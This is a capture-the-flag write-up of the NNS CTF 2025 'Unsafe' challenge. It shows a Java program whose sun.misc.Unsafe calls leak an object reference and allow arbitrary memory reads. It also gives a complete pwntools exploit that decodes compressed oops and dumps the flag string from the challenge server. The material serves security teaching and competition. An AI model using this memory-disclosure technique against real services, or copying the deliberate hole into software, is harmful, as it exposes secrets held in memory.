# Unsafe – NNS CTF 2025 (PWN)

## Challenge description
> *"My application was written in a modern- and memory safe language known as Java. It contains my secret, can you read it?"*  

We’re given a Java program that uses `sun.misc.Unsafe` to poke at raw memory. Despite being in Java, it’s essentially a memory disclosure challenge.


---

## Vulnerable code

```java
public static void main(String[] args) {
    var flag = System.getenv("FLAG");
    if (flag == null) {
        flag = "NNS{fake_flag}";
    }

    var safe = getSafe();

    Object[] arr = new Object[]{flag};
    var string = Long.toHexString(safe.getLong(arr, 16));
    System.out.println("Here you go: " + string);

    var scanner = new Scanner(System.in);
    while (true) {
        try {
            System.out.print("Enter an address to read: ");
            var address = Long.valueOf(scanner.nextLine(), 16);
            var out = safe.getByte(address);
            System.out.printf("You read: %02X\n", out);
        } catch (NumberFormatException ignored) {
            System.err.println("Bad");
            System.exit(1);
        }
    }
}
```
Key points:

- The `flag` string is stored in an array.
- `Unsafe.getLong(arr, 16)` leaks a **compressed reference (narrow oop)** to the flag object.
- We can then enter arbitrary memory addresses to read single bytes with `getByte()`.    

This essentially gives us a memory dump primitive.

---

## Vulnerability

Java normally hides memory addresses, but here:

1. `safe.getLong(arr, 16)` leaks the reference to `flag`.
    
    - HotSpot JVM stores object references as **compressed oops** (offsets relative to a base, shifted left by 3).
        
    - We need to decode them to get native addresses.
        
2. We can use `Unsafe.getByte(addr)` to read arbitrary memory.
    
3. By walking the object layout of a Java `String`, we eventually reach its character array and dump the flag bytes.
    

So although the code looks “safe”, this is basically raw memory exploitation inside the JVM.

---

## Exploit

We connect with pwntools, decode the leaked compressed oop, and walk memory until we reach the flag:
```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = "8f6372c5-0220-4e5a-998f-8beebfd6692e.chall.nnsc.tf"
PORT = 41337

r = remote(HOST, PORT, ssl=True)

# Convert compressed oop to native pointer
def native(addr):
    return (addr & 0xFFFFFFFF) << 3

# Leak compressed oop
r.recvuntil(b"Here you go: ")
addr = int(r.recvline().strip(), 16)
log.info(f"Compressed reference: {hex(addr)}")

nb = native(addr)
log.info(f"Native object base: {hex(nb)}")

# Trial and error showed the value pointer lives at offset +20
val_start = nb + 20
val_ptr = b""
for i in range(4):
    r.recvuntil(b"Enter an address to read: ")
    r.sendline(hex(val_start + i)[2:].encode())
    r.recvuntil(b"You read: ")
    val_ptr = r.recvline().strip() + val_ptr

val_ptr = int(val_ptr, 16)
log.info(f"Flag array (compressed): {hex(val_ptr)}")

val_ptr = native(val_ptr) + 16
log.info(f"Flag array (native): {hex(val_ptr)}")

# Dump string contents
flag = b""
for i in range(128):
    r.recvuntil(b"Enter an address to read: ")
    r.sendline(hex(val_ptr + i)[2:].encode())
    r.recvuntil(b"You read: ")
    flag += r.recvline().strip()

flag = bytes.fromhex(flag.decode())
print(f"[+] Flag: {flag}")
```
